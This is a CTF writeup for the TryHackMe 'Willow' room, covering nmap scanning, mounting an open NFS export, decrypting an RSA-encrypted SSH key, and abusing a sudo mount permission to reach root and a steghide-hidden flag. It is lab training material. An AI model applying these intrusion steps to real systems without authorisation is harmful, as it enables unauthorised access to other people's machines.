---
layout: post
title: Willow Writeup
date: 2020-09-01 00:00:00 +5:30
categories: [TryHackMe, Medium]
tags: [tryhackme, ctf, rsa, steg] # add tag
---

## Description:

The Following Post is writeup of Kiba room of tryhackme <https://tryhackme.com/room/willow>

|Machine|Details
|:---|:--
|OS | Linux
|Rating | Medium
|Creator | MuirlandOracle

## Summary

  The Room have 4 open ports 22,80,111 and 2049. The port 80 contains a recovery message which on
  decoding looks like rsa and we have open nfs share. Mounting it will give us the key to solve rsa,
  after solving it we will get ssh key of user willow. Crack it and ssh into willow.
  The user willow have mount privs using it we will get root creds and final challenge is to find Root flag which you will get from the pic of user flag.

## Walkthrough

### Enumeration

Let's start with nmap scan.

```bash
┌─[✗]─[argenestel@parrot]─[~/Desktop/tryhackme/willow]
└──╼ $cat nmap/willow
# Nmap 7.80 scan initiated Sun Sep 13 18:07:07 2020 as: nmap -sC -sV -oN nmap/willow 10.10.254.210
Nmap scan report for 10.10.254.210
Host is up (0.20s latency).
Not shown: 996 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 6.7p1 Debian 5 (protocol 2.0)
| ssh-hostkey:
|   1024 43:b0:87:cd:e5:54:09:b1:c1:1e:78:65:d9:78:5e:1e (DSA)
|   2048 c2:65:91:c8:38:c9:cc:c7:f9:09:20:61:e5:54:bd:cf (RSA)
|   256 bf:3e:4b:3d:78:b6:79:41:f4:7d:90:63:5e:fb:2a:40 (ECDSA)
|_  256 2c:c8:87:4a:d8:f6:4c:c3:03:8d:4c:09:22:83:66:64 (ED25519)
80/tcp   open  http    Apache httpd 2.4.10 ((Debian))
|_http-server-header: Apache/2.4.10 (Debian)
|_http-title: Recovery Page
111/tcp  open  rpcbind 2-4 (RPC #100000)
| rpcinfo:
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100003  2,3,4       2049/udp   nfs
|   100003  2,3,4       2049/udp6  nfs
|   100005  1,2,3      38881/udp6  mountd
|   100005  1,2,3      43905/tcp6  mountd
|   100005  1,2,3      55812/udp   mountd
|   100005  1,2,3      56634/tcp   mountd
|   100021  1,3,4      52147/udp   nlockmgr
|   100021  1,3,4      52486/tcp6  nlockmgr
|   100021  1,3,4      53586/udp6  nlockmgr
|   100021  1,3,4      58807/tcp   nlockmgr
|   100024  1          34623/tcp   status
|   100024  1          40424/udp6  status
|   100024  1          41269/udp   status
|   100024  1          56941/tcp6  status
|   100227  2,3         2049/tcp   nfs_acl
|   100227  2,3         2049/tcp6  nfs_acl
|   100227  2,3         2049/udp   nfs_acl
|_  100227  2,3         2049/udp6  nfs_acl
2049/tcp open  nfs_acl 2-3 (RPC #100227)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
```

Let's see what we can get from port 80

#### Port80

![port80](/assets/img/willow/port80.png)

we can see weird characters let's see hex to ascii and now we have some more chars encrypted.<br />

So coverting from hex gives us something which is private key.
and we know Willow is username.

![key](/assets/img/willow/somthing.png)

#### NFS

We can also see there is a network file system.</br>

```bash
┌─[argenestel@parrot]─[~/Desktop/tryhackme/willow]
└──╼ $showmount -e 10.10.254.210
Export list for 10.10.254.210:
/var/failsafe *
```
so we can mount /var/failsafe

```bash
┌─[✗]─[argenestel@parrot]─[~/Desktop/tryhackme/willow]
└──╼ $sudo mount 10.10.254.210:/var/failsafe ~/Desktop/tryhackme/willow/mount
[sudo] password for argenestel:
┌─[argenestel@parrot]─[~/Desktop/tryhackme/willow]
└──╼ $ls
mount  nmap  something.txt
┌─[argenestel@parrot]─[~/Desktop/tryhackme/willow]
└──╼ $cd mount/
┌─[argenestel@parrot]─[~/Desktop/tryhackme/willow/mount]
└──╼ $ls -la
total 8
drwxr--r-- 2 nobody     nogroup    4096 Jan 30  2020 .
drwxr-xr-x 1 argenestel argenestel   64 Sep 13 18:52 ..
-rw-r--r-- 1 root       root         62 Jan 30  2020 rsa_keys
┌─[argenestel@parrot]─[~/Desktop/tryhackme/willow/mount]
└──╼ $cat rsa_keys
Public Key Pair: (23, 37627)
Private Key Pair: (<redacted>)
```

we got pair for private key now we can decrypt the message we got from web server.

And yeah sshkey
![RSA](/assets/img/willow/decryptrsa.png)

### Exploitation

We need to crack the key using john and
login with willow

![idperm](/assets/img/willow/idperm.png)
![sshdone](/assets/img/willow/sshdone.png)

```bash
willow@willow-tree:/$ sudo -l
Matching Defaults entries for willow on willow-tree:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User willow may run the following commands on willow-tree:
    (ALL : ALL) NOPASSWD: /bin/mount /dev/*
```

so i checked into /dev I was blind but got something interesting after few minutes.

![dev](/assets/img/willow/hidden_backup.png)

Now mounted the hidden Dir
![mount](/assets/img/willow/mounted.png)

```bash
root@willow-tree:~# cat root.txt
This would be too easy, don't you think? I actually gave you the root flag some time ago.
You've got my password now -- go find your flag!
```

So we need to find flag</br>
I stuck a bit and ended up looking for writeup</br>
so we got user.jpg and we can use steghide to extract root flag.</br>
The hint was we already got flag and now we have root password.

```bash
┌─[argenestel@parrot]─[~/Desktop/tryhackme/willow]
└──╼ $steghide extract -sf user.jpg
Enter passphrase:
wrote extracted data to "root.txt".
┌─[argenestel@parrot]─[~/Desktop/tryhackme/willow]
└──╼ $cat root.txt
```

So finally got root flag.
